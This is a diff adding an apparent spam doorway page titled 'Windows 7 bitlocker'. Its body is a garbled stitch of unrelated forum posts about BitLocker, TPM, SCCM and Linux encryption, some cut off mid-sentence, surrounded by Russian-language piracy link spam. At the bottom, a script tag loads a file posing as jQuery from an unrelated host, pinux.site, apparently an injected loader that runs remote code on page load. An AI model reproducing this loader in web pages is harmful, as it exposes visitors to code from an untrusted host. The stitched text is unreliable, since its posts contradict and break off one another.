@@ -1,0 +1,144 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Windows 7 bitlocker - okahreing.neimanmarcus.ai</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">okahreing.neimanmarcus.ai</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Windows 7 bitlocker</h2>
+                            </header>
+                            <p> Hello everyone. We're making the jump from XP to 7, however security is a main concern of ours. We're planning on encrypting all of our drives with BitLocker, now here is where the string of questions comes in. We use SCCM to bring down the images, we had originally started with the BitLocker enabled. However, BitLocker ties its encryption keys to the TPM in the laptops. Why this is a worrying issue is the fact that we are using one of each specific model of laptop to SCCM the image, followed. So I'm in a group in engineering that is heavily linux focused. The company norm is Windows, and most policies are around that. But linux is allowed, there's just not any standards in place around it. We've been using linux desktops for a while, which I talked to IT and got approval for. No one ever cared, awesome. We had a guy get a Dell 7730 because he works remote mostly. I built it Ubuntu 18.04, LUKS encryption with a yubikey. It has AV on it, and of course the firewall enabled. We started our 3 years ago with a small deployment with Bitlocker on Windows 8 with MBAM, went fairly smooth with a few bumps here and there. We then expanded and added Windows 10 clients(40 clients), no issues there. Now that we are informed MBAM is going away we are now in the process of doing a \~ 400 client rollout with Windows 10 Bitlocker and we agreed on storing our keys in AD and not using MBAM. Is there a way to determine how many clients are successfully encrypted by running powershell. 
+As per the title really. I'm working with a Dell house and just wondering what's the ideal workflow to implement for prepping the TPM to be ready for new install of Windows + BitLocker (for fresh machine out of the box as well as wipeampreload older machines). I've opened a premier case with MS about this, but as they have been less than responsive so far, i figured i'd throw it out to the masses and see if anyone else has encountered this. Scenario: We have a fleet of Window 7 computers that we are in the process of upgrading to Windows 10 1803 Enterprise. I have built the in-place upgrade TS, and everything works fine across all of our various models. The last steps in the TS also enable bitlocker, which we are deploying for the first time. Hey guys long time lurker, first time poster. amp#x200B; So I will do my best to keep this concise but it is a complicated situation. amp#x200B; My uncle recently started a business. He worked himself to the bone for several months getting it off the ground. In that time, he got the flu. Rather than take a few days off, he chose to stay up and keep working through it. His flu got worse, and eventually led to pneumonia. The pneumonia got so bad he finally relented and checked 
+I recently started working on a Windows 7 to Windows 10 In-place upgrade. I'm trying to do the UEFI conversion before the actual upgrade. The problem I'm having is that even when I suspend Bitlocker, I get prompted for a recovery key after the reboot to WindowsPE before PE even starts to load. This indicates the drive is locked so even if I put in the key the UEFI conversion fails. I'm not understanding why BitLocker gets re-enabled just for WinPE. I didn't have this issue when doing Window. OK, I'm hoping someone knows how to bypass Windows stupid Bitlocker rules. amp#x200B; I just built a new machine that does NOT have a TPM. I have two small SSD's in BIOS RAID1 for my boot drive, and currently only four large HDD's in a mirror configuration similar to RAID10 using Windows space management (long story on that). amp#x200B; I'm NOT worried about theft of my device or unauthorized use. I am worried about the quality of my hard drives, as they were dirt cheap. The system I did a lot of searching over the past few weeks but couldn't find an all-in-one solution for this, so I set out to make my own. My colleagues suggested afterwards that others might benefit as well if I shared it out. Background: Our environment is majority Dell laptops and desktops, secured using Bitlocker encrypted drives, and we'd been having an issue where sometimes computers were losing their TPM information when rebooted. The only temporary fix we had was pulling the battery and performin. 
+OK so as the thread title indicates, I'm meeting with the owners of a company we manage on Monday to discuss the possibility of allowing their sales team to load a VPN client on their home computers to access company data. At the last company I managed before getting into MSP, we required the users to have the Forticlient AV/VPN software installed and even then, restricted remote access to only our NAS with the file share. No server access at all. While I don't know exactly what the remote. Coming from a Linux/Mac background, I'm looking for advice on how to implement simple management of windows laptops. We're a startup with around 100 employees, most of whom are using Macs managed w/ Jamf Pro. However, about a quarter of our employees now use Windows machines, currently unmanaged. We want to lock those down from a security perspective. We use G Suite for email amp SSO, no MS software other than O365 for office apps, everything in the cloud, no on-prem services/intranet. Limit. I’m wondering what form of encryption folks implement and why. I know Veeam allows you to encrypt the bup job (or file). And Windows has bitlocker which would allow for an encrypted volume. I know both together would be unnecessary, so I’m trying to figure which is “best”. What there any advantages or disadvantages to using Veeam’s encryption over Windows’ bitlocker; Or vice versa? I’m mostly curious in regards to Bup Copy Jobs -gt rotated USB. But I suppose (and I’ve been wrong before). Good Afternoon fellow Sysadmin's, amp#x200B; I was looking into using Windows 10/Bitlocker to encrypt the hard drives for my company (roughly 1k client workstations total), and i was wondering about the management aspect of it. amp#x200B; Could someone point me in the right direction? Thanks in advance. Hello, I would like to install fedora 29 on my old Dell Venue Pro 11, so far it works really smooth but being a tablet I'd like it encrypted as well in case of loss, the problem is, that on boot, haven't found a way to put the password, and no on-screen keyboard from the tablet pops up, it does with windows 10 bitlocker, but not with the Fedora boot. Was wondering if someone has some experience with this, or would be able to point me in the right direction, thanks I had bitlocker option in SSD (c:) and External HDD's but i do not have this option on HDD drive (E:) Any idea to to enable this option on hdd? https://i.imgur.com/DiFX9cM.png (https://i.imgur.com/DiFX9cM.png). 
+Hello Guys, Wondering if you could help me with this one: I've created an image of a Windows 10 Bitlocker encrypted drive using guymager. I chose expert witness format and splitted into files of 20GB. I am also in the possession of the Bitlocker recovery key. Now I want to mount this image for further analysis. I don't have access to commercial tools like Encase, so I tried imagemounter using the command mentioned in the docs: https://imagemounter.readthedocs.io/en/latest/specifics.html#bde. When I started rolling out Bitlocker with Windows 8 PCs years ago, I configured the group policy settings to store the recovery keys in Active Directory, specify the encryption, use TPM, etc. These settings worked and I could manually enable Bitlocker on the PCs as desired. Over the last year I noticed new Windows 10 PCs I set up on the domain are automatically enabling Bitlocke. I don't see any GPO settings which turn Bitlocker on. I thought my GPO settings were just confguring Bitlocker settin. Edit: that is supposed to say CMDLET. Damn autocorrect. Recently added wmf 5.1 to our windows 7 machines. Oddly (to me) the suspend-botlocker cmdlet and the Bitlocker module are not on win7 systems. Is it possible to add a module to windows 7? Is this importing a module? Incidentally, suspend-bitlocker works fine on win10 - both win7 and win10 are bitlocked. Thanks for any guidance. Not really sure how this part of powershell works - I can just write some simple scripts. On Windows 10 1703+, does setting the FIPS mode GPO make any changes to the functionality of Bitlocker or EFS? In reading about this GPO and Bitlocker, the majority of information is talking about depreciated features, like the elephant diffuser. In this document under the 1703 section it shows that all of the Bitlocker modes use validated crypto modules, and elsewhere it is listed that EFS uses AES256 by default in Windows 10. https://docs.microsoft.com/en-us/windows/security/threat-protection/. I received two days ago my X16C, FHD, i7, 16GB, PM981 1TB SSD and I have a few questions. I have tried to search for the answers in the Reddit and forum but it is not clear. I guess if they were answered you can blame my poor search skills. Ah, so far, I have no found any issues: screen is aligned and close properly, no dead pixels, no weird sounds, etc. So far I am very satisfied. Even those things that were considered bad I found them okay. For example, the fingerprint reader So I’m using Windows 10 bitlocker feature without a TPM (its all software). The drive is encrypted successfully and it’s worked just fine for over a year (it always asked me to type in a password specifically for decrypting the drive like it’s supposed to.) Lately, however, sometimes when I boot up my machine it doesn’t ask me for the bitlocker password. It just boots straight to the PIN. The first time I thought maybe my brain was fucking up cause I thought that was literally impossible. Operating System ================== Windows 7 Computer Specs (PSU, GPU, CPU, RAM, Motherboard) ================== dell Inspiron 3147 Speccy Link ================== N/A Description of problem ================== I recently dual booted my dell Inspiron 3147 with windows 7 and 10. I used Bitlocker to encrypt the windows 10 side but when I try to encrypt the fresh install of windows 7 I get a error. A compatible trusted platform module (tpm) security device must be present on this computer I unfortunately decided to try Windows 10 BitLocker on my external Seagate GoFlex HDD and now it no longer works. It just makes a consistent noise when plugged in and is not recognized as a drive on Windows. When I started the BitLocker process, I left it to go about its business. When I returned, the progress window was gone and there was no open dialog boxes or anything saying it was completed. And now it is just in this state. I uploaded a video so that the sound can be heard. I have tried. </p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="tlw6o-skachat-korabl-kovcheg-3-sezon.html">Скачать корабль ковчег 3 сезон</a></li>
+                                <li><a href="tlw6o-reshebnik-po-angl-yaz-8-klass-vaulina.html">Решебник по англ яз 8 класс ваулина</a></li>
+                                <li><a href="tlw6o-skachat-muzyku-besplatno-ligalayz-vse-pesni.html">Скачать музыку бесплатно лигалайз все песни</a></li>
+                                <li><a href="tlw6o-dlya-chego-nuzhna-skorost-otdachi-v-torrente.html">Для чего нужна скорость отдачи в торренте</a></li>
+                                <li><a href="tlw6o-dzhi-ay-dzho-2-skachat-torrent.html">Джи ай джо 2 скачать торрент</a></li>
+                                <li><a href="tlw6o-sliping-dogs-skachat-ot-mehanikov.html">Слипинг догс скачать от механиков</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="tlw6o-leningradskiy-zhd-vokzal-moskva-raspisanie.html">Ленинградский жд вокзал москва расписание</a></li>
+                                            <li><a href="tlw6o-igry-skachat-besplatno-lg-kf300.html">Игры скачать бесплатно lg kf300</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="tlw6o-skachat-s-torrenta-chernobyl-zona-otchuzhdeniya-serial.html">Скачать с торрента чернобыль зона отчуждения сериал</a></li>
+                                            <li><a href="tlw6o-izumrud-kuprin-audiokniga.html">Изумруд куприн аудиокнига</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="tlw6o-nvidia-drayver-300.html">Nvidia драйвер 300</a></li>
+                                            <li><a href="tlw6o-skachat-r-u-s-e.html">Скачать r u s e</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="tlw6o-skachat-besplatno-kartinki-na-mobilu.html">Скачать бесплатно картинки на мобилу</a></li>
+                                            <li><a href="tlw6o-gost-krs-55-goda.html">Гост крс 55 года</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
